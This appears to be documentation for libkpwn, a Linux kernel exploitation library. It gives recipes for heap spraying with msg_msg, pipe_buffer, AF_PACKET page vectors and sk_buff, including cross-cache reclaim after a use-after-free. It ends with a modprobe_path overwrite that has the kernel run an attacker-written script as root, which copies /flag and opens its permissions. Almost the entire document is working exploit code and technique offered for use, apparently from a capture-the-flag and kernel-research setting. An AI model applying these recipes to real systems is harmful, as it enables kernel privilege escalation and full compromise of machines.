# Spray Cookbook

Recipes for common heap-spray patterns using libkpwn's spray module.

## Object size guide

Pick the spray object that lands in the right kmalloc cache for your target:

| Object | Header size | Min alloc | Max useful payload | Typical caches |
| --- | --- | --- | --- | --- |
| `msg_msg` | 48 B | 64 B | ~8 KB (MSGMAX per segment) | kmalloc-64 → kmalloc-8k |
| `msg_msgseg` | 8 B | — | chained after msg_msg | same as msg_msg |
| `user_key_payload` | 24 B | 48 B | arbitrary | kmalloc-cg-* |
| `sk_buff` | varies | ~256 B | data + 320 B shinfo trailer | kmalloc-512 → kmalloc-4k |
| `pipe_buffer` | 40 B per slot | 16 slots × 40 B | page-backed | kmalloc-cg-1k (ring) |
| `setxattr` | 0 | 1 B | arbitrary | kmalloc-* (alloc-then-free) |
| `pgv` (packet page) | — | PAGE_SIZE | page-level granularity | page allocator |

## Recipe 1: kmalloc-256 spray with msg_msg

```c
#include <kpwn/kpwn.h>

// Target: UAF object in kmalloc-256
// msg_msg header = 48, so payload = 256 - 48 = 208
#define N_SPRAY 256
#define PAYLOAD_SIZE (256 - KPWN_MSG_HDR_SIZE)

int qids[N_SPRAY];
char payload[PAYLOAD_SIZE];
memset(payload, 'A', sizeof(payload));

kpwn_spray_msg(qids, N_SPRAY, payload, sizeof(payload));
// ... trigger UAF ...
kpwn_free_msg(qids, N_SPRAY);
```

## Recipe 2: Cross-cache msg_msg → pipe_buffer

```c
#include <kpwn/kpwn.h>

// Step 1: Defrag the target slab
#define N_DEFRAG 1024
int defrag_qids[N_DEFRAG];
kpwn_defrag_msg(defrag_qids, N_DEFRAG, TARGET_OBJ_SIZE);

// Step 2: Spray contiguous pages worth of target objects
#define N_SPRAY 512
int spray_qids[N_SPRAY];
kpwn_spray_msg(spray_qids, N_SPRAY, data, TARGET_OBJ_SIZE, 0);

// Step 3: Trigger the vulnerability (UAF in one of the spray objects)
// ...

// Step 4: Free ALL spray objects → pages return to buddy
kpwn_free_msg(spray_qids, N_SPRAY);

// Step 5: Reclaim with a different object type
struct kpwn_pipe pipes[N_SPRAY];
kpwn_spray_pipe(pipes, N_SPRAY);
kpwn_write_pipe(pipes, N_SPRAY, evil_data, sizeof(evil_data));

// Step 6: Read the corrupted pipe_buffer via the dangling pointer
// ...

// Cleanup
kpwn_free_pipe(pipes, N_SPRAY);
kpwn_free_msg(defrag_qids, N_DEFRAG);
```

## Recipe 3: Page-level spray with pgv

```c
// AF_PACKET page vector spray for page-level UAF exploitation
#define N_PGV 64
int pgv_fds[N_PGV];

// Each socket allocates block_nr × (block_size / PAGE_SIZE) pages
kpwn_spray_pgv(pgv_fds, N_PGV,
    0x1000,  // block_size = 1 page
    1,       // block_nr = 1 block per socket
    0x1000); // frame_size = 1 page

// ... page-level UAF trigger ...
kpwn_free_pgv(pgv_fds, N_PGV);
```

## Recipe 4: sk_buff spray for OOB read

```c
struct kpwn_skb_pair pairs[32];
char skb_data[256 - KPWN_SKB_SHARED_INFO_SIZE];
memset(skb_data, 0, sizeof(skb_data));

kpwn_spray_skb(pairs, 32, 4, skb_data, sizeof(skb_data));
// ... OOB read via the vulnerability ...
// recv() from pairs[i].fd[1] to read back (possibly corrupted) data
kpwn_free_skb(pairs, 32);
```

## Recipe 5: Post-exploitation via modprobe_path

```c
// After achieving arbitrary kernel write:
// 1. Write a payload script
system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/pwn.sh");
system("chmod +x /tmp/pwn.sh");

// 2. Overwrite modprobe_path using your write primitive
kpwn_overwrite_modprobe(kbase, KSYM_MODPROBE_PATH, "/tmp/pwn.sh",
                        my_kernel_write, NULL);

// 3. Trigger modprobe execution
kpwn_trigger_modprobe("/tmp/dummy");

// 4. Read the flag
system("cat /tmp/flag");
```
